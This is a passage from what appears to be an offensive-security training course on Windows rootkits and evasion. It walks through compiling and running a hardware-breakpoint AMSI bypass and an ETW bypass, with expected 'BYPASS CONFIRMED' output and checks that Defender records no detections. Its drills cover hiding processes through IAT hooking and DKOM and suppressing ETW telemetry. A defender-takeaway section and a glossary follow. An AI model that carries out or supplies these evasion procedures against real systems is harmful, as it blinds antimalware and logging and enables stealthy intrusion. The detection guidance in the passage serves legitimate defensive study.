  [+] AmsiScanBuffer at 0x00007FFF3A2B1234

  [*] AMSI is loaded and AmsiScanBuffer is at 0x00007FFF3A2B1234
  [*] --check mode: not setting breakpoint.
```

Addresses will differ on your machine. What matters: both lines print
successfully. If "LoadLibrary failed" — amsi.dll is not available.
Ensure you are on Windows 10/11 with Defender installed.

### Step 3 — Run Bypass Test (No PowerShell Spawn)

```
amsi_hwbp.exe --test
```

**EXPECTED OUTPUT:**
```
  --- PHASE 1: LOCATE AMSI ---

  [+] amsi.dll loaded at 0x00007FFF3A2B0000
  [+] AmsiScanBuffer at 0x00007FFF3A2B1234

  --- PHASE 2: SET HARDWARE BREAKPOINT ---

  [+] VEH handler registered (first in chain)
  [*] Current DR0: 0x0000000000000000  DR7: 0x0000000000000000
  [+] Hardware breakpoint set: DR0 = 0x00007FFF3A2B1234
  [+] DR7 = 0x0000000000000001 (DR0 enabled, execution, 1-byte)
  [+] NO memory modified in amsi.dll
  [+] NO VirtualProtect called

  --- PHASE 3: VERIFY BYPASS ---

  [*] Calling AmsiScanBuffer directly to test bypass...
  [+] AmsiScanBuffer returned 0x80070057 (E_INVALIDARG)
  [+] BYPASS CONFIRMED — AMSI is blind
  [+] result parameter = 0 (never written — function never ran)

  [*] --test mode: skipping PowerShell spawn.
```

"BYPASS CONFIRMED" is the pass condition. If you see "BYPASS FAILED":
- The VEH handler did not receive the exception
- Possible cause: another exception handler earlier in the chain is consuming it
- Check if a debugger is attached (debuggers intercept single-step exceptions)
- Run without a debugger attached

### Step 4 — Confirm AMSI is Bypassed in PowerShell

Run the bypass in normal mode (spawns PowerShell):

```
amsi_hwbp.exe
```

**NOTE:** The bypass applies to the amsi_hwbp.exe process. The spawned
PowerShell child is a SEPARATE process with its own thread contexts (DR0=0).
For testing, use PowerShell inside the amsi_hwbp.exe process context by
calling PowerShell APIs via COM/IDispatch (advanced), OR test AMSI bypass
in the same process via direct AmsiScanBuffer calls (Step 3 above).

For a simple end-to-end test: run a PowerShell one-liner that uses AMSI
to scan an EICAR-like string. Without bypass, Defender blocks it. With
an in-process bypass, it passes.

### Step 5 — Verify No Detections in Windows Defender

After running the test, check Defender's detection history:

```powershell
Get-MpThreatDetection | Where-Object { $_.Resources -match 'amsi_hwbp' }
```

**EXPECTED OUTPUT (success):**
```
(no output — empty result set)
```

If Defender detected anything, the output will list threat entries.
Empty = no detection = bypass worked or Defender didn't observe it.

Also check:
```powershell
Get-MpComputerStatus | Select-Object -Property AMSIEnabled, RealTimeProtectionEnabled
```

**EXPECTED OUTPUT:**
```
AMSIEnabled                   : True
RealTimeProtectionEnabled     : True
```

Both should be True. If AMSI is disabled, the bypass is irrelevant —
confirm you're testing against active protection.

### Step 6 — Confirm Zero Memory Modification in amsi.dll

This verifies the technique's advantage over classic patching:

```powershell
# Get amsi.dll's mapped base in a test process (use your amsi_hwbp.exe PID)
# Then compare its in-memory bytes to the on-disk file
# Using Get-FileHash for a quick check:

Get-FileHash "C:\Windows\System32\amsi.dll" -Algorithm SHA256
```

Run this before and after the HWBP bypass. The hash should be IDENTICAL
both times — because we never modified amsi.dll's file or mapped pages.

Compare against:
```
certutil -hashfile "C:\Windows\System32\amsi.dll" SHA256
```

Same hash = same bytes = nothing was patched.

### Compile Commands Summary

```
# AMSI HWBP bypass (user-mode, no admin):
cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-

# ETW HWBP bypass (user-mode, no admin):
cl.exe etw_hwbp_annotated.c /Fe:etw_hwbp.exe /O1 /GS-

# Debug build with banner output (VDR_DEBUG defined):
cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp_debug.exe /O1 /GS- /DVDR_DEBUG

# Both in one command:
cl.exe amsi_bypass_hwbp_annotated.c etw_hwbp_annotated.c /Fe:dark_room.exe /O1 /GS-
```

All commands run from the "Developer Command Prompt for VS 2022".
No admin required. No driver needed. Runs on any standard Windows 10/11
user account with Defender enabled.

// DRILL: Compile amsi_hwbp.exe, bypass AMSI, run EICAR string in PowerShell, confirm 0 detections.
// Then compile etw_hwbp.exe and confirm that ETW events from your process disappear
// from Event Viewer (Windows Logs → Application → PowerShell sources) while the bypass is active.

---

## DEFENDER TAKEAWAY

You built the tools. Now you know what to watch for. Here is what to
actually DO on Monday morning to detect and prevent rootkit activity
in a real Windows environment.

- **Enable and monitor Event ID 7045 (System log)** — fires every time a
  new service (driver) is installed. A BYOVD attack loads a vulnerable
  driver first. This event will show it. Alert on any driver installation
  that isn't part of a scheduled software deployment, especially drivers
  with random-looking names or located outside `C:\Windows\System32\drivers\`.

- **Enable and monitor Event ID 6 (Microsoft-Windows-CodeIntegrity/Operational)**
  — logs every kernel driver load attempt, including ones that fail DSE
  checks. Blocked attempts mean someone is trying to load an unsigned driver.
  This catches BYOVD attempts that fail.

- **Check AppInit_DLLs registry key regularly** — the key
  `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`
  should be blank on any hardened system. Any value here means a DLL is
  being injected into every GUI process. Audit this with:
  ```
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
  ```
  Expected: `AppInit_DLLs` value is empty or the key shows `(value not set)`.

- **Run Autoruns (Sysinternals) weekly and diff against last week's output.**
  Autoruns shows every persistence mechanism Windows supports. Save the
  output as a text file each week. A new entry in the Drivers or AppInit
  sections that you didn't install is a red flag.

- **Use Process Explorer (Sysinternals) with VirusTotal integration enabled.**
  Right-click any unknown process → Check VirusTotal. More importantly:
  Process Explorer reads kernel structures directly — it is NOT fooled by
  IAT hooks in other processes. A process visible in Process Explorer but
  not in `tasklist` indicates a user-mode rootkit hooking the tasklist process.

- **Verify SSDT integrity with a periodic WinDbg check on a monitored system.**
  In WinDbg attached to a live kernel: `dq nt!KiServiceTable L200` — every
  address should resolve to a function inside a loaded driver module.
  An address outside any driver range = SSDT hook installed.

- **Enable Secure Boot and verify it is active** — go to Settings → System →
  Recovery → Advanced startup → Restart → UEFI Firmware Settings and confirm
  Secure Boot is ON. This blocks all MBR/UEFI bootkits that lack a valid
  Secure Boot bypass. It is the single highest-value hardware-level control
  against rootkit persistence.

- **Take periodic memory snapshots of critical servers using DumpIt or WinPMem.**
  Run `volatility windows.psscan` vs `windows.pslist` on each snapshot and
  diff the results. Any process in psscan but not pslist is a hidden process.
  Any unexpected executable private memory region from `windows.malfind` is
  injected code. Do this monthly on domain controllers and file servers — the
  machines most worth rooting.

- **Monitor for SetThreadContext calls with debug register modifications.**
  Modern EDRs (CrowdStrike Falcon, SentinelOne) instrument SetThreadContext.
  An unusual SetThreadContext call that writes non-zero values to DR registers
  is a hardware breakpoint being set — flag it for investigation. Defender for
  Endpoint (MDE) has HWBP-specific detection rules as of late 2024. Test your
  environment to confirm whether VADER's HWBP technique is detected.

- **Enable PowerShell Script Block Logging (EventID 4104).**
  `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`
  → `EnableScriptBlockLogging = 1`. Every script that runs gets logged.
  ETW bypass silences real-time ETW streams, but script block logging can
  be routed through alternative channels. Defend in depth — don't rely on
  a single log source.

---

## Key Terms

| Term | Definition |
|------|-----------|
| **IAT hooking** | Overwriting Import Address Table function pointers to redirect calls to a hook function |
| **Inline hook** | Patching the first bytes of a function with a jump to a hook function |
| **Trampoline** | Stub code that executes the original bytes displaced by a hook, then jumps back into the original function |
| **EPROCESS** | Kernel data structure representing a process; contains all process metadata including the ActiveProcessLinks list entry |
| **DKOM** | Direct Kernel Object Manipulation — modifying kernel data structures to hide information (e.g., unlinking EPROCESS from the active process list) |
| **SSDT** | System Service Descriptor Table — maps syscall numbers to kernel function addresses; hooking it intercepts all syscalls of a given type |
| **PatchGuard (KPP)** | Kernel Patch Protection — periodically verifies integrity of protected kernel structures; triggers BSOD on tampering |
| **IRP** | I/O Request Packet — the fundamental message-passing structure for kernel I/O; filter drivers intercept IRPs |
| **Filter driver** | Driver that sits in a device stack above or below another driver, intercepting IRPs passing through |
| **Mini-filter** | Modern filter driver model using Filter Manager (fltmgr.sys); preferred over legacy filter drivers |
| **DSE** | Driver Signature Enforcement — kernel policy requiring drivers to be signed with a valid certificate |
| **BYOVD** | Bring Your Own Vulnerable Driver — loading a legitimately signed but vulnerable driver to gain kernel write access |
| **Bootkit** | Malware infecting the boot chain before the OS loads; can defeat OS-level defenses including PatchGuard |
| **Hypervisor rootkit** | Malware that inserts itself below the OS as a hypervisor; runs at VMX root mode (ring -1) |
| **EPT** | Extended Page Tables — hardware-assisted memory virtualisation; allows hypervisor to maintain shadow memory views |
| **pslist vs psscan** | Volatility comparison: pslist walks the linked list (DKOM-bypassable), psscan finds pool tags in raw memory (DKOM-resistant) |
| **malfind** | Volatility plugin that finds executable private memory containing PE signatures — primary tool for detecting code injection |
| **Kernel callbacks** | Registered notification routines called by the kernel on process/thread/image events; EDRs use these for early visibility |
| **WDK** | Windows Driver Kit — Microsoft's SDK for kernel-mode driver development; required to compile any code that runs as a Windows driver |
| **TESTSIGNING** | Boot option that allows unsigned kernel drivers to load; required for development/testing; visible as a desktop watermark |
| **AMSI** | Antimalware Scan Interface — Windows API that passes script content to AV engines before execution; built into PowerShell, WScript, .NET |
| **AmsiScanBuffer** | The core AMSI function that scripts call to submit content for scanning; exported from amsi.dll |
| **ETW** | Event Tracing for Windows — kernel telemetry bus; EDRs consume ETW streams for behavioral analysis |
| **EtwEventWrite** | User-mode function in ntdll.dll through which all ETW events pass before reaching the kernel |
| **NtTraceEvent** | Syscall that EtwEventWrite calls to write events to the kernel ETW buffer |
| **Hardware breakpoint** | CPU-native breakpoint using DR0-DR3 registers; fires EXCEPTION_SINGLE_STEP without modifying code |
| **DR0-DR3** | Debug address registers — hold the addresses of up to four hardware breakpoints |
| **DR7** | Debug control register — enables/disables each DR breakpoint and sets condition (execution, write, read/write) |
| **VEH** | Vectored Exception Handler — exception handler registered via AddVectoredExceptionHandler; runs before SEH, first in chain |
| **EXCEPTION_SINGLE_STEP** | Windows exception code raised when a hardware breakpoint fires or TF flag triggers; caught by VEH handler |
| **E_INVALIDARG** | HRESULT 0x80070057 — "invalid argument" error; returned by AMSI bypass to make PowerShell treat the scan as inconclusive |
| **SetThreadContext** | Win32 API to write CPU register values including DR0-DR7; used to arm hardware breakpoints without kernel access |
| **HWBP** | Hardware breakpoint — shorthand for DR register-based breakpoint technique |

---

## Drill 11 — Rootkits

Go to `DRILLS/11_rootkits/`. A driver development environment and test VM
are configured with TESTSIGNING=ON and kernel debugging enabled.

Your missions:

1. **IAT hook**: In the provided test harness, hook `EnumProcesses` via IAT.
   Hide the harness's own PID from the returned list. Verify with a second
   tool that calls `EnumProcesses` — it should not show your process.

2. **Inline hook**: Hook `CreateFileW` via inline/trampoline method. Log
   all file path arguments to a buffer. Verify the original function still
   works (files open normally). Read the log buffer to confirm interception.

3. **DKOM**: Load the provided test driver. Use it to unlink the test
   process EPROCESS from `ActiveProcessLinks`. Verify:
   - `tasklist` does NOT show the process
   - `psscan` via WinDbg `!process 0 0` comparison DOES show it
   - Process is still running (it continues printing to its window)

4. **Volatility analysis**: Take a memory image of the test VM after step 3.
   Run `windows.pslist` and `windows.psscan`. Document the discrepancy.
   Run `windows.malfind` against the injected process from Drill 10 image.
   Document what it finds.

5. **Callback enumeration**: Use WinDbg `dq nt!PspCreateProcessNotifyRoutine L20`
   to list all registered process creation callbacks. Identify which
   belong to EDR-like components vs native OS. Document each entry.

6. **AMSI HWBP bypass**: Compile amsi_hwbp.exe from source. Run with `--test`.
   Confirm output shows "BYPASS CONFIRMED". Verify amsi.dll file hash matches
   before and after (zero memory modification). Run `Get-MpThreatDetection` and
   confirm no detections triggered.

7. **ETW bypass**: Compile etw_hwbp.exe. Run with `--test`. Open Event Viewer
   and confirm that PowerShell-sourced ETW events disappear from the stream
   while the bypass is active. Remove the bypass and confirm events resume.

The goal of steps 4-5 is to train DETECTION awareness alongside technique
knowledge. Every technique you deploy will be visible to these tools
in a forensic scenario. Know your trace before you leave it.

Steps 6-7 are the new capability layer — user-mode evasion BEFORE kernel
techniques are needed. These run as standard user, no driver, no BSOD risk.
Build them first.

---

— data structures SEVERED from the list, still breathing,
the census taker counts what the ARCHITECTURE chooses to show
